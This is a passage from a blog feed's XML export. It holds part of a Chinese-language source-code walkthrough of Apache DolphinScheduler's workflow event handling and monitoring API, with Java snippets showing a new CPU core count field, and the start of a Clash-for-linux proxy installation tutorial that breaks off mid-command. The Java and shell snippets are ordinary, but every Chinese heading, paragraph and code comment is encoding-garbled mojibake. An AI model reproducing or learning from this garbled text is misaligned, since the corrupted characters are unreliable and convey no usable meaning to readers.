class="string">&quot;Handle workflow event failed, will add this event to event queue again, event: &#123;&#125;&quot;</span>,</span><br><span class="line">                workflowEvent, workflowEventHandleException);</span><br><span class="line">            workflowEventQueue.addEvent(workflowEvent);</span><br><span class="line">            ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (WorkflowEventHandleError workflowEventHandleError) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Handle workflow event error, will drop this event, event: &#123;&#125;&quot;</span>,</span><br><span class="line">                         workflowEvent,</span><br><span class="line">                         workflowEventHandleError);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unknownException) &#123;</span><br><span class="line">            logger.error(</span><br><span class="line">                <span class="string">&quot;Handle workflow event failed, get a unknown exception, will add this event to event queue again, event: &#123;&#125;&quot;</span>,</span><br><span class="line">                workflowEvent, unknownException);</span><br><span class="line">            workflowEventQueue.addEvent(workflowEvent);</span><br><span class="line">            ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            LoggerUtils.removeWorkflowInstanceIdMDC();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.2.4 workerflowäº‹ä»¶å¤„ç†é€»è¾‘</strong></p><p><strong>DS</strong></p><p>å› ä¸ºæ˜¯START_WORKFLOWç±»å‹çš„æ‰€ä»¥è·å–åˆ°Â WorkflowStartEventHandler.handleWorkflowEvent() æ¥å¤„ç†è¯¥äº‹ä»¶ã€‚</p><p>è¯¥æ–¹æ³•ä¸­ï¼Œè·å– WorkflowExecuteRunnable ï¼Œè¿è¡Œå¼‚æ­¥ä»»åŠ¡è°ƒç”¨ call æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleWorkflowEvent</span><span class="params">(WorkflowEvent workflowEvent)</span> <span class="keyword">throws</span> WorkflowEventHandleError &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;Handle workflow start event, begin to start a workflow, event: &#123;&#125;&quot;</span>, workflowEvent);</span><br><span class="line"><span class="comment">//è·å–WorkflowExecuteRunnable </span></span><br><span class="line">    <span class="type">WorkflowExecuteRunnable</span> <span class="variable">workflowExecuteRunnable</span> <span class="operator">=</span></span><br><span class="line">       processInstanceExecCacheManager.getByProcessInstanceId(workflowEvent.getWorkflowInstanceId());</span><br><span class="line">    <span class="keyword">if</span> (workflowExecuteRunnable == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WorkflowEventHandleError</span>(</span><br><span class="line">            <span class="string">&quot;The workflow start event is invalid, cannot find the workflow instance from cache&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ProcessInstance</span> <span class="variable">processInstance</span> <span class="operator">=</span> workflowExecuteRunnable.getProcessInstance();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    ProcessInstanceMetrics.incProcessInstanceSubmit();</span><br><span class="line">   <span class="comment">//å¼‚æ­¥è°ƒç”¨callæ–¹æ³•æ‰§è¡ŒworkflowExecuteè¿è¡Œé€»è¾‘ã€‚</span></span><br><span class="line"> CompletableFuture&lt;WorkflowSubmitStatue&gt; workflowSubmitFuture =</span><br><span class="line">        CompletableFuture.supplyAsync(workflowExecuteRunnable::call, workflowExecuteThreadPool);</span><br><span class="line">    workflowSubmitFuture.thenAccept(workflowSubmitStatue -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (WorkflowSubmitStatue.SUCCESS == workflowSubmitStatue) &#123;</span><br><span class="line">            <span class="comment">// submit failed will resend the event to workflow event queue</span></span><br><span class="line">            logger.info(<span class="string">&quot;Success submit the workflow instance&quot;</span>);<span class="comment">//ç›‘å¬è¿”å›çŠ¶æ€æ˜¯å¦æˆåŠŸ</span></span><br><span class="line">            <span class="keyword">if</span> (processInstance.getTimeout() &gt; <span class="number">0</span>) &#123;<span class="comment">//æ˜¯å¦è¶…æ—¶</span></span><br><span class="line">                stateWheelExecuteThread.addProcess4TimeoutCheck(processInstance);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//å‡ºç°å¼‚å¸¸ï¼Œé‡è¯•ï¼Œé‡æ–°è¿›å…¥é˜Ÿåˆ—ï¼Œè°ƒç”¨callæ–¹æ³•</span></span><br><span class="line">            logger.error(<span class="string">&quot;Failed to submit the workflow instance, will resend the workflow start event: &#123;&#125;&quot;</span>,</span><br><span class="line">                         workflowEvent);</span><br><span class="line">            workflowEventQueue.addEvent(<span class="keyword">new</span> <span class="title class_">WorkflowEvent</span>(WorkflowEventType.START_WORKFLOW,</span><br><span class="line">                                                          processInstance.getId()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.2.5Â workerflowRunnableè¿è¡Œé€»è¾‘</strong></p><p><strong>DS</strong></p><p><strong>WorkflowExecuteRunnable.call()</strong></p><ul><li>åˆå§‹åŒ–workerflowçš„æœ‰å‘æ— ç¯å›¾ã€‚</li><li>åˆå§‹åŒ–ä»»åŠ¡è°ƒåº¦é…ç½®</li><li>æäº¤æºå¤´ä»»åŠ¡åˆ°ä»»åŠ¡ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­ã€‚</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="dolphinscheduler" scheme="http://blog.ioimp.top/tags/dolphinscheduler/"/>
    
    <category term="å¤§æ•°æ®åˆ†æå¹³å°" scheme="http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    <category term="GitHub" scheme="http://blog.ioimp.top/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>dolphinschedulerç›‘æ§åŠŸèƒ½åˆ¨æ</title>
    <link href="http://blog.ioimp.top/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/"/>
    <id>http://blog.ioimp.top/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/</id>
    <published>2023-07-18T01:43:54.000Z</published>
    <updated>2023-08-04T01:46:07.073Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="dolphinscheduleræºç åˆ†æè®°å½•"><a href="#dolphinscheduleræºç åˆ†æè®°å½•" class="headerlink" title="dolphinscheduleræºç åˆ†æè®°å½•"></a>dolphinscheduleræºç åˆ†æè®°å½•</h1><h1 id="Dolphinscheduler-api-1"><a href="#Dolphinscheduler-api-1" class="headerlink" title="Dolphinscheduler-api-1"></a>Dolphinscheduler-api-1</h1><h2 id="MonitorController-javaéƒ¨åˆ†"><a href="#MonitorController-javaéƒ¨åˆ†" class="headerlink" title="MonitorController.javaéƒ¨åˆ†"></a>MonitorController.javaéƒ¨åˆ†</h2><ul><li><input checked="" disabled="" type="checkbox"> ä»»åŠ¡ä¸€ï¼šæ–°å¢åŠŸèƒ½è·å–master&#x2F;workæœåŠ¡å™¨CPUæ ¸å¿ƒæ•°ç›®ä»¥åŠä¸€å…±ç£ç›˜å¤§å°ï¼Œ</li><li><input disabled="" type="checkbox"> ä»»åŠ¡äºŒï¼šåˆ†æå¦‚ä½•å‘ç›‘æ§ä¸­å¿ƒAPIä¸­å†™å…¥master&#x2F;workæœåŠ¡å™¨CPUæ ¸å¿ƒæ•°ç›®ä»¥åŠä¸€å…±ç£ç›˜å¤§å°ï¼Œ</li></ul><p>æ ¸å¿ƒä»£ç éƒ¨åˆ†:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * master list</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginUser login user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> master list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;listMaster&quot;, notes = &quot;MASTER_LIST_NOTES&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/masters&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.OK)</span></span><br><span class="line">    <span class="meta">@ApiException(LIST_MASTERS_ERROR)</span></span><br><span class="line">    <span class="meta">@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">listMaster</span><span class="params">(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestAttribute(value = Constants.SESSION_USER)</span> User loginUser)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; result = monitorService.queryMaster(loginUser);</span><br><span class="line">        <span class="keyword">return</span> returnDataList(result);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>MonitorService.javaæ¥å£åŠŸèƒ½æ ¸å¿ƒéƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; <span class="title function_">queryMaster</span><span class="params">(User loginUser)</span>;</span><br></pre></td></tr></table></figure><p>MonitorServiceImpl.javaæ¥å£å®ç°ç±»æ ¸å¿ƒéƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * query master list</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginUser login user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> master information list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">queryMaster</span><span class="params">(User loginUser)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        List&lt;Server&gt; masterServers = getServerListFromRegistry(<span class="literal">true</span>);</span><br><span class="line">        result.put(Constants.DATA_LIST, masterServers);</span><br><span class="line">        putMsg(result, Status.SUCCESS);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>result.put(Constants.*DATA_LIST*, masterServers);</code> è¯­å¥ä¸­<code>Constants.*DATA_LIST*</code>  æ˜¯å‰ç«¯jsoné‡Œçš„dataæ•°ç»„éƒ¨åˆ†ï¼Œè£…å…¥masterServers  </p><p><code>getServerListFromRegistry(true);</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Server&gt; <span class="title function_">getServerListFromRegistry</span><span class="params">(<span class="type">boolean</span> isMaster)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isMaster</span><br><span class="line">            ? registryClient.getServerList(NodeType.MASTER)</span><br><span class="line">            : registryClient.getServerList(NodeType.WORKER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>registryClient.getServerList(NodeType.*MASTER*)</code> è·å–masterèŠ‚ç‚¹çš„æœåŠ¡ä¿¡æ¯åˆ—è¡¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Server&gt; <span class="title function_">getServerList</span><span class="params">(NodeType nodeType)</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; serverMaps = getServerMaps(nodeType, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">parentPath</span> <span class="operator">=</span> rootNodePath(nodeType);</span><br><span class="line"></span><br><span class="line">        List&lt;Server&gt; serverList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : serverMaps.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">serverPath</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">String</span> <span class="variable">heartBeatJson</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isEmpty(heartBeatJson)) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;The heartBeatJson is empty, serverPath: &#123;&#125;&quot;</span>, serverPath);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">            <span class="keyword">switch</span> (nodeType) &#123;</span><br><span class="line">                <span class="keyword">case</span> MASTER:</span><br><span class="line">                    <span class="type">MasterHeartBeat</span> <span class="variable">masterHeartBeat</span> <span class="operator">=</span> JSONUtils.parseObject(heartBeatJson, MasterHeartBeat.class);</span><br><span class="line">                    server.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>(masterHeartBeat.getStartupTime()));</span><br><span class="line">                    server.setLastHeartbeatTime(<span class="keyword">new</span> <span class="title class_">Date</span>(masterHeartBeat.getReportTime()));</span><br><span class="line">                    server.setId(masterHeartBeat.getProcessId());</span><br><span class="line">                    server.setCpuCoreCount(masterHeartBeat.getCpuCoreCount());<span class="comment">//è·å–cpuæ ¸å¿ƒæ•°</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> WORKER:</span><br><span class="line">                    <span class="type">WorkerHeartBeat</span> <span class="variable">workerHeartBeat</span> <span class="operator">=</span> JSONUtils.parseObject(heartBeatJson, WorkerHeartBeat.class);</span><br><span class="line">                    server.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>(workerHeartBeat.getStartupTime()));</span><br><span class="line">                    server.setLastHeartbeatTime(<span class="keyword">new</span> <span class="title class_">Date</span>(workerHeartBeat.getReportTime()));</span><br><span class="line">                    server.setId(workerHeartBeat.getProcessId());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            server.setResInfo(heartBeatJson);</span><br><span class="line">            <span class="comment">// todo: add host, port in heartBeat Info, so that we don&#x27;t need to parse this again</span></span><br><span class="line">            server.setZkDirectory(parentPath + <span class="string">&quot;/&quot;</span> + serverPath);</span><br><span class="line">            <span class="comment">// set host and port</span></span><br><span class="line">            String[] hostAndPort = serverPath.split(COLON);</span><br><span class="line">            String[] hosts = hostAndPort[<span class="number">0</span>].split(DIVISION_STRING);</span><br><span class="line">            <span class="comment">// fetch the last one</span></span><br><span class="line">            server.setHost(hosts[hosts.length - <span class="number">1</span>]);</span><br><span class="line">            server.setPort(Integer.parseInt(hostAndPort[<span class="number">1</span>]));</span><br><span class="line">            serverList.add(server);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serverList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>[MasterHeartBeat</code>.java](<a href="http://masterheartbeat.java/">http://MasterHeartBeat.java</a>) masterå¿ƒè·³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment"> * contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment"> * this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment"> * The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment"> * (the &quot;License&quot;); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment"> * the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.apache.dolphinscheduler.common.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MasterHeartBeat</span> <span class="keyword">implements</span> <span class="title class_">HeartBeat</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> startupTime;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> reportTime;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> cpuUsage;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> memoryUsage;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> loadAverage;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> availablePhysicalMemorySize;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> maxCpuloadAvg;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> reservedMemory;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> diskAvailable;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> processId;</span><br><span class="line">    <span class="comment">// æ–°å¢æ ¸æ•°</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> cpuCoreCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿›ä¸€æ­¥æ·±å…¥è§£æ</p><p>åˆ°è¿™é‡Œ <code>getHeartBeat()</code> æ–¹æ³•è¿™é‡Œå¼€å§‹è°ƒç”¨æœ€å…³é”®çš„ä¸€æ­¥.cpuCoreCount(OSUtils.getCPUCoreCount()) çœŸæ­£çš„è·å–masterèŠ‚ç‚¹æ ¸å¿ƒcupæ•°é‡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="dolphinscheduler" scheme="http://blog.ioimp.top/tags/dolphinscheduler/"/>
    
    <category term="å¤§æ•°æ®åˆ†æå¹³å°" scheme="http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    <category term="GitHub" scheme="http://blog.ioimp.top/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>Clash-for-linuxä½¿ç”¨æ•™ç¨‹</title>
    <link href="http://blog.ioimp.top/2023/05/15/clash-for-linux/"/>
    <id>http://blog.ioimp.top/2023/05/15/clash-for-linux/</id>
    <published>2023-05-15T15:57:27.000Z</published>
    <updated>2023-08-15T16:06:28.465Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ä½¿ç”¨æ•™ç¨‹"><a href="#ä½¿ç”¨æ•™ç¨‹" class="headerlink" title="ä½¿ç”¨æ•™ç¨‹"></a>ä½¿ç”¨æ•™ç¨‹</h1><h2 id="ä¸‹è½½é¡¹ç›®"><a href="#ä¸‹è½½é¡¹ç›®" class="headerlink" title="ä¸‹è½½é¡¹ç›®"></a>ä¸‹è½½é¡¹ç›®</h2><p>ä¸‹è½½é¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/wanhebin/clash-for-linux.git</span><br></pre></td></tr></table></figure><p>è¿›å…¥åˆ°é¡¹ç›®ç›®å½•ï¼Œç¼–è¾‘<code>.env</code>æ–‡ä»¶ï¼Œä¿®æ”¹å˜é‡<code>CLASH_URL</code>çš„å€¼ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> clash-for-linux</span><br><span class="line">$ vim .<span class="built_in">env</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>æ³¨æ„ï¼š</strong> <code>.env</code> æ–‡ä»¶ä¸­çš„å˜é‡ <code>CLASH_SECRET</code> ä¸ºè‡ªå®šä¹‰ Clash Secretï¼Œå€¼ä¸ºç©ºæ—¶ï¼Œè„šæœ¬å°†è‡ªåŠ¨ç”Ÿæˆéšæœºå­—ç¬¦ä¸²ã€‚</p></blockquote><br><h2 id="å¯åŠ¨ç¨‹åº"><a href="#å¯åŠ¨ç¨‹åº" class="headerlink" title="å¯åŠ¨ç¨‹åº"></a>å¯åŠ¨ç¨‹åº</h2><p>ç›´æ¥è¿è¡Œè„šæœ¬æ–‡ä»¶<code>start.sh</code></p><ul><li>è¿›å…¥é¡¹ç›®ç›®å½•</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> clash-for-linux</span><br></pre></td></tr></table></figure><ul><li>è¿è¡Œå¯åŠ¨è„šæœ¬</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bash start.sh</span><br><span class="line"></span><br><span class="line">æ­£åœ¨æ£€æµ‹è®¢é˜…åœ°å€...</span><br><span class="line">Clashè®¢é˜…åœ°å€å¯è®¿é—®ï¼                                      [  OK  ]</span><br><span class="line"></span><br><span class="line">æ­£åœ¨ä¸‹è½½Clashé…ç½®æ–‡ä»¶...</span><br><span class="line">é…ç½®æ–‡ä»¶config.yamlä¸‹è½½æˆåŠŸï¼                              [  OK  ]</span><br><span class="line"></span><br><span class="line">æ­£åœ¨å¯åŠ¨ClashæœåŠ¡...</span><br><span class="line">æœåŠ¡å¯åŠ¨æˆåŠŸï¼                                             [  OK  ]</span><br><span class="line"></span><br><span class="line">Clash Dashboard è®¿é—®åœ°å€ï¼šhttp://&lt;ip&gt;:9090/ui</span><br><span class="line">Secretï¼šxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">è¯·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åŠ è½½ç¯å¢ƒå˜é‡: <span class="built_in">source</span> /etc/profile.d/clash.sh</span><br><span class="line"></span><br><span class="line">è¯·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼€å¯ç³»ç»Ÿä»£ç†: proxy_on</span><br><span class="line"></span><br><span class="line">è‹¥è¦ä¸´æ—¶å…³é—­ç³»ç»Ÿä»£ç†ï¼Œè¯·æ‰§è¡Œ: proxy_off</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> /etc/profile.d/clash.sh</span><br><span class="line">$ proxy_on</span><br></pre></td></tr></table></figure><ul><li>æ£€æŸ¥æœåŠ¡ç«¯å£</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -tln | grep -E <span class="string">&#x27;9090|789.&#x27;</span></span><br><span class="line">tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN     </span><br><span class="line">tcp6       0      0 :::7890                 :::*                    LISTEN     </span><br><span class="line">tcp6       0      0 :::7891                 :::*                    LISTEN     </span><br><span class="line">tcp6       0      0 :::7892                 :::*                    LISTEN</span><br></pre></td></tr></table></figure><ul><li>æ£€æŸ¥ç¯å¢ƒå˜é‡</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">env</span> | grep -E <span 